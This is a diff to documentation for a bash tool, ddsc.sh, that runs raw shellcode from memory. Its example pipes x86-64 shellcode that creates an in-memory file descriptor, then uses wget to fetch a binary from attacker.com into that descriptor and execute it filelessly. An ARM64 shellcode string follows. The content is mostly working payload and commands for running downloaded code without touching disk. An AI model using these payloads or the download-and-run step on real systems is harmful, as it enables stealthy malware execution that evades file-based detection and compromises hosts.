@@ -20,11 +20,11 @@ There is also the `ddsc.sh` script that allows you to run binary code directly.
 The following is an example of the use of a shellcode that will create a memfd (a file descriptor pointing to a file in memory) to which we can later write binaries and run them, from memory obviously.
 ```
 bash ddsc.sh -x <<< "68444541444889e74831f64889f0b401b03f0f054889c7b04d0f05b0220f05" &
-cd /proc/6506/fd
+cd /proc/$!/fd
 wget -O 4 https://attacker.com/binary.elf
 ./4
 ```
-or in ARM64
+In ARM64 the process is similar, only the shellcode changes
 ```
 bash ddsc.sh -x <<< "802888d2a088a8f2e00f1ff8e0030091210001cae82280d2010000d4c80580d2010000d4881580d2010000d4610280d2281080d2010000d4"
 ```
